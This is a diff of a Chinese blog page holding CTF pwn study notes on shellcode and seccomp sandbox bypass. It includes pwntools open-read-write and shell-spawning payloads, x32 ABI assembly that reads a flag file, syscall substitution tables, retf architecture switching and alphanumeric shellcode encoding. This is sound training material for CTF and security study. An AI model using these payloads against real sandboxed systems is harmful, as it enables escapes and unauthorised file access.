@@ -22,12 +22,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="一些考点沙箱绕过常规orw要注意常规orw和调用elf里面的open函数不一样，elf里面的实质上是openat函数 jihe这个时候要找gadgets控制寄存器，然后再找syscall；ret这种gadgets ROPgadget 加上 –multibr就能找这种gadgets 生成方式： 1.shellcraft配合函数生成 123456def orw_shellcode():    payl">
+  <meta name="description" content="一些考点 沙箱绕过 常规orw 要注意常规orw和调用elf里面的open函数不一样，elf里面的实质上是openat函数 jihe 这个时候要找gadgets控制寄存器，然后再找syscall；ret这种gadgets ROPgadget 加上 --multibr就能找这种gadgets 生成方式： 1.shellcraft配合函数生成 123456def orw_shellcode():">
 <meta property="og:type" content="article">
 <meta property="og:title" content="shellcode">
 <meta property="og:url" content="http://example.com/2023/09/23/shellcode/index.html">
 <meta property="og:site_name" content="hkbin的小博客~">
-<meta property="og:description" content="一些考点沙箱绕过常规orw要注意常规orw和调用elf里面的open函数不一样，elf里面的实质上是openat函数 jihe这个时候要找gadgets控制寄存器，然后再找syscall；ret这种gadgets ROPgadget 加上 –multibr就能找这种gadgets 生成方式： 1.shellcraft配合函数生成 123456def orw_shellcode():    payl">
+<meta property="og:description" content="一些考点 沙箱绕过 常规orw 要注意常规orw和调用elf里面的open函数不一样，elf里面的实质上是openat函数 jihe 这个时候要找gadgets控制寄存器，然后再找syscall；ret这种gadgets ROPgadget 加上 --multibr就能找这种gadgets 生成方式： 1.shellcraft配合函数生成 123456def orw_shellcode():">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-09-23T15:33:59.000Z">
 <meta property="article:modified_time" content="2023-09-23T15:41:11.540Z">
@@ -229,89 +229,130 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="一些考点"><a href="#一些考点" class="headerlink" title="一些考点"></a>一些考点</h1><h2 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h2><h3 id="常规orw"><a href="#常规orw" class="headerlink" title="常规orw"></a>常规orw</h3><p>要注意常规orw和调用elf里面的open函数不一样，elf里面的实质上是openat函数</p>
-<p>jihe<br>这个时候要找gadgets控制寄存器，然后再找syscall；ret这种gadgets</p>
-<p>ROPgadget 加上 –multibr就能找这种gadgets</p>
+        <h1>一些考点</h1>
+<h2 id="沙箱绕过">沙箱绕过</h2>
+<h3 id="常规orw">常规orw</h3>
+<p>要注意常规orw和调用elf里面的open函数不一样，elf里面的实质上是openat函数</p>
+<p>jihe<br>
+这个时候要找gadgets控制寄存器，然后再找syscall；ret这种gadgets</p>
+<p>ROPgadget 加上 --multibr就能找这种gadgets</p>
 <p>生成方式：</p>
 <p>1.shellcraft配合函数生成</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">orw_shellcode</span>():</span><br><span class="line">    payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">    payload+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">    payload+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">    payload=asm(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
-
 <p>2.shellcraft自带sh</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
-
 <p>3.网上payload</p>
 <p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes">Exploit Database Shellcodes (exploit-db.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/114106118">pwn题shellcode收集_pyiiiiiiiiiiqzvtx30vx4ap0a3hh0a00abaabtaaq2ab2bb0b___lifanxin的博客-CSDN博客</a></p>
-<h3 id="使用未限制函数"><a href="#使用未限制函数" class="headerlink" title="使用未限制函数"></a>使用未限制函数</h3><p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">Chromium OS Docs - Linux System Call Table (googlesource.com)</a></p>
+<h3 id="使用未限制函数">使用未限制函数</h3>
+<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">Chromium OS Docs - Linux System Call Table (googlesource.com)</a></p>
 <p>可以参考这个链接使用平替函数</p>
-<ul>
-<li>seccomp黑名单<ul>
-<li>execve→execveat</li>
-<li>open→openat</li>
-<li>read→readv, pread64, preadv, preadv2</li>
-<li>write→writev, pwrite64, pwritev, pwritev2</li>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>seccomp黑名单</p>
+<ul class="lvl-2">
+<li class="lvl-6">execve→execveat</li>
+<li class="lvl-6">open→openat</li>
+<li class="lvl-6">read→readv, pread64, preadv, preadv2</li>
+<li class="lvl-6">write→writev, pwrite64, pwritev, pwritev2</li>
 </ul>
 </li>
-<li>read和write都禁止了还可以用sendfile</li>
+<li class="lvl-2">
+<p>read和write都禁止了还可以用sendfile</p>
+</li>
 </ul>
-<h3 id="x32-abi绕过"><a href="#x32-abi绕过" class="headerlink" title="x32 abi绕过"></a>x32 abi绕过</h3><p>本质是调用32位下的函数，仍能使用</p>
+<h3 id="x32-abi绕过">x32 abi绕过</h3>
+<p>本质是调用32位下的函数，仍能使用</p>
 <p>利用条件为 没有限制sys_number&lt;0x40000000</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">lea rax,[rip]</span><br><span class="line">add rax,<span class="number">0x200</span></span><br><span class="line">mov rsp,rax ;  因为rsp被清空，先将栈迁移至可读写位置</span><br><span class="line"></span><br><span class="line">mov eax,<span class="number">0x67616c66</span> ;  <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rsi,rsi</span><br><span class="line">mov rax,<span class="number">0x40000002</span> ;  <span class="built_in">open</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rax,rsp</span><br><span class="line">add rax,<span class="number">0x100</span></span><br><span class="line">mov rsi,rax</span><br><span class="line">mov rdx,<span class="number">0x40</span></span><br><span class="line">mov rax,<span class="number">0x40000000</span> ;  read</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov edi,<span class="number">2</span></span><br><span class="line">mov rax,<span class="number">0x40000001</span> ;  write</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-
-<h3 id="架构切换绕过"><a href="#架构切换绕过" class="headerlink" title="架构切换绕过"></a>架构切换绕过</h3><p>进入32位模式</p>
+<h3 id="架构切换绕过">架构切换绕过</h3>
+<p>进入32位模式</p>
 <p>利用条件：</p>
-<ul>
-<li>沙箱中不包含对arch&#x3D;&#x3D;ARCH_x86_64的检测</li>
-<li>存在或可构造32位地址的RWX内存段</li>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>沙箱中不包含对arch==ARCH_x86_64的检测</p>
+</li>
+<li class="lvl-2">
+<p>存在或可构造32位地址的RWX内存段</p>
+</li>
 </ul>
-<h3 id="进入32位模式"><a href="#进入32位模式" class="headerlink" title="进入32位模式"></a><strong>进入32位模式</strong></h3><p>进入32位模式需要更改CS寄存器为0x23。retf (far return) 指令可以帮助我们做到这一点。retf指令相当于：</p>
+<h3 id="进入32位模式"><strong>进入32位模式</strong></h3>
+<p>进入32位模式需要更改CS寄存器为0x23。retf (far return) 指令可以帮助我们做到这一点。retf指令相当于：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br></pre></td></tr></table></figure>
-
 <p>需要注意的是，在使用pwntools构造shellcode时，需要指定retf的地址长度，即可以使用retfd和retfq。</p>
-<h3 id="ptrace绕过"><a href="#ptrace绕过" class="headerlink" title="ptrace绕过"></a>ptrace绕过</h3><ul>
-<li>ptrace在老版本的linux（before 4.8）上能绕过seccomp</li>
-<li>even ubuntu 18 kernel version is 5.3</li>
+<h3 id="ptrace绕过">ptrace绕过</h3>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>ptrace在老版本的linux（before 4.8）上能绕过seccomp</p>
+</li>
+<li class="lvl-2">
+<p>even ubuntu 18 kernel version is 5.3</p>
+</li>
 </ul>
-<p><a target="_blank" rel="noopener" href="https://www.notion.so/">https://www.notion.so</a></p>
-<h2 id="更多限制绕过"><a href="#更多限制绕过" class="headerlink" title="更多限制绕过"></a>更多限制绕过</h2><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><ol>
-<li>手写&#x2F;修改shellcode</li>
-<li>使用exx寄存器</li>
-<li>使用push+pop代替mov+立即数</li>
-<li>使用xor xxx 代替mov 0</li>
-<li>现成代码</li>
+<p><a target="_blank" rel="noopener" href="https://www.notion.so">https://www.notion.so</a></p>
+<h2 id="更多限制绕过">更多限制绕过</h2>
+<h3 id="长度限制">长度限制</h3>
+<ol>
+<li class="lvl-3">
+<p>手写/修改shellcode</p>
+</li>
+<li class="lvl-3">
+<p>使用exx寄存器</p>
+</li>
+<li class="lvl-3">
+<p>使用push+pop代替mov+立即数</p>
+</li>
+<li class="lvl-3">
+<p>使用xor xxx 代替mov 0</p>
+</li>
+<li class="lvl-3">
+<p>现成代码</p>
+</li>
 </ol>
 <p>或者用最爱的再read一次</p>
-<h3 id="IO流绕过"><a href="#IO流绕过" class="headerlink" title="IO流绕过"></a>IO流绕过</h3><p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">CTF中常见的C语言输入函数截断属性总结 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
+<h3 id="IO流绕过">IO流绕过</h3>
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">CTF中常见的C语言输入函数截断属性总结 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
 <p>关掉了某些流</p>
 <p>可以尝试从这些流读取 stdin stderr</p>
-<h3 id="手搓shellcode"><a href="#手搓shellcode" class="headerlink" title="手搓shellcode"></a>手搓shellcode</h3><p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode - NetSec</a></p>
+<h3 id="手搓shellcode">手搓shellcode</h3>
+<p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode - NetSec</a></p>
 <p>这篇文章有机器码对应汇编</p>
-<h3 id="限制可见字符"><a href="#限制可见字符" class="headerlink" title="限制可见字符"></a>限制可见字符</h3><p>ae64工具</p>
+<h3 id="限制可见字符">限制可见字符</h3>
+<p>ae64工具</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/veritas501/ae64">https://github.com/veritas501/ae64</a></p>
 <p>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-<h3 id="侧信道"><a href="#侧信道" class="headerlink" title="侧信道"></a>侧信道</h3><ul>
-<li>依次爆破flag中每个字符<ul>
-<li>不同 &#x3D;&gt; 死循环 &#x3D;&gt; TCP连接保持</li>
-<li>相同 &#x3D;&gt; 程序退出 &#x3D;&gt; TCP连接断开</li>
+<h3 id="侧信道">侧信道</h3>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>依次爆破flag中每个字符</p>
+<ul class="lvl-2">
+<li class="lvl-6">不同 =&gt; 死循环 =&gt; TCP连接保持</li>
+<li class="lvl-6">相同 =&gt; 程序退出 =&gt; TCP连接断开</li>
 </ul>
 </li>
-<li>pwntools判断断开：<ul>
-<li>io.connected()</li>
-<li>send之后except (BrokenPipeError, EOFError):</li>
+<li class="lvl-2">
+<p>pwntools判断断开：</p>
+<ul class="lvl-2">
+<li class="lvl-6">io.connected()</li>
+<li class="lvl-6">send之后except (BrokenPipeError, EOFError):</li>
 </ul>
 </li>
 </ul>
-<h1 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h1><p>编译命令gcc .&#x2F;xxx.c -o .&#x2F;xxx -lseccomp -no-pie</p>
-<h1 id="x64"><a href="#x64" class="headerlink" title="x64:"></a>x64:</h1><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>syscall 0x0f 0x05</p>
-<h2 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h2><p>jmp rax 0xff 0xe0</p>
+<h1>附：</h1>
+<p>编译命令gcc ./xxx.c -o ./xxx -lseccomp -no-pie</p>
+<h1>x64:</h1>
+<h2 id="系统调用">系统调用</h2>
+<p>syscall 0x0f 0x05</p>
+<h2 id="跳转">跳转</h2>
+<p>jmp rax 0xff 0xe0</p>
 <p>jmp rbx 0xff 0xe3</p>
 <p>jmp rcx 0xff 0xe1</p>
 <p>jmp rdx 0xff 0xe2</p>
 <p>jmp rdi 0xff 0xe7</p>
 <p>jmp rsi 0xff 0xe6</p>
-<h2 id="堆栈操作"><a href="#堆栈操作" class="headerlink" title="堆栈操作"></a>堆栈操作</h2><p>push rax 0x50</p>
+<h2 id="堆栈操作">堆栈操作</h2>
+<p>push rax 0x50</p>
 <p>push rbx 0x53</p>
 <p>push rcx 0x51</p>
 <p>push rdx 0x52</p>
@@ -323,9 +364,12 @@
 <p>pop rdx 0x5A</p>
 <p>pop rdi 0x5F</p>
 <p>pop rsi 0x5E</p>
-<h2 id="Mov"><a href="#Mov" class="headerlink" title="Mov"></a>Mov</h2><p>mov比较多 得具体问题具体分析</p>
-<h2 id="加减乘除"><a href="#加减乘除" class="headerlink" title="加减乘除"></a>加减乘除</h2><p>这个也比较多，得具体问题具体分析</p>
-<h3 id="交换寄存器"><a href="#交换寄存器" class="headerlink" title="交换寄存器"></a>交换寄存器</h3><p>xchg</p>
+<h2 id="Mov">Mov</h2>
+<p>mov比较多 得具体问题具体分析</p>
+<h2 id="加减乘除">加减乘除</h2>
+<p>这个也比较多，得具体问题具体分析</p>
+<h3 id="交换寄存器">交换寄存器</h3>
+<p>xchg</p>
 
     </div>
 
@@ -409,7 +453,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E8%80%83%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">一些考点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.</span> <span class="nav-text">沙箱绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84orw"><span class="nav-number">1.1.1.</span> <span class="nav-text">常规orw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%9C%AA%E9%99%90%E5%88%B6%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.2.</span> <span class="nav-text">使用未限制函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x32-abi%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.3.</span> <span class="nav-text">x32 abi绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E5%88%87%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.4.</span> <span class="nav-text">架构切换绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E5%85%A532%E4%BD%8D%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.1.5.</span> <span class="nav-text">进入32位模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ptrace%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.6.</span> <span class="nav-text">ptrace绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%B4%E5%A4%9A%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.</span> <span class="nav-text">更多限制绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-number">1.2.1.</span> <span class="nav-text">长度限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO%E6%B5%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.2.</span> <span class="nav-text">IO流绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E6%90%93shellcode"><span class="nav-number">1.2.3.</span> <span class="nav-text">手搓shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6"><span class="nav-number">1.2.4.</span> <span class="nav-text">限制可见字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%A7%E4%BF%A1%E9%81%93"><span class="nav-number">1.2.5.</span> <span class="nav-text">侧信道</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">附：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x64"><span class="nav-number">3.</span> <span class="nav-text">x64:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">3.1.</span> <span class="nav-text">系统调用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC"><span class="nav-number">3.2.</span> <span class="nav-text">跳转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%A0%88%E6%93%8D%E4%BD%9C"><span class="nav-number">3.3.</span> <span class="nav-text">堆栈操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mov"><span class="nav-number">3.4.</span> <span class="nav-text">Mov</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4"><span class="nav-number">3.5.</span> <span class="nav-text">加减乘除</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%A4%E6%8D%A2%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">3.5.1.</span> <span class="nav-text">交换寄存器</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">一些考点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.</span> <span class="nav-text">沙箱绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84orw"><span class="nav-number">1.1.1.</span> <span class="nav-text">常规orw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%9C%AA%E9%99%90%E5%88%B6%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.2.</span> <span class="nav-text">使用未限制函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x32-abi%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.3.</span> <span class="nav-text">x32 abi绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E5%88%87%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.4.</span> <span class="nav-text">架构切换绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E5%85%A532%E4%BD%8D%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.1.5.</span> <span class="nav-text">进入32位模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ptrace%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.6.</span> <span class="nav-text">ptrace绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%B4%E5%A4%9A%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.</span> <span class="nav-text">更多限制绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-number">1.2.1.</span> <span class="nav-text">长度限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO%E6%B5%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.2.</span> <span class="nav-text">IO流绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E6%90%93shellcode"><span class="nav-number">1.2.3.</span> <span class="nav-text">手搓shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6"><span class="nav-number">1.2.4.</span> <span class="nav-text">限制可见字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%A7%E4%BF%A1%E9%81%93"><span class="nav-number">1.2.5.</span> <span class="nav-text">侧信道</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">附：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">x64:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">3.1.</span> <span class="nav-text">系统调用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC"><span class="nav-number">3.2.</span> <span class="nav-text">跳转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%A0%88%E6%93%8D%E4%BD%9C"><span class="nav-number">3.3.</span> <span class="nav-text">堆栈操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mov"><span class="nav-number">3.4.</span> <span class="nav-text">Mov</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4"><span class="nav-number">3.5.</span> <span class="nav-text">加减乘除</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%A4%E6%8D%A2%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">3.5.1.</span> <span class="nav-text">交换寄存器</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -483,13 +527,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">55k</span>
+    <span title="站点总字数">51k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">3:22</span>
+    <span title="站点阅读时长">3:05</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
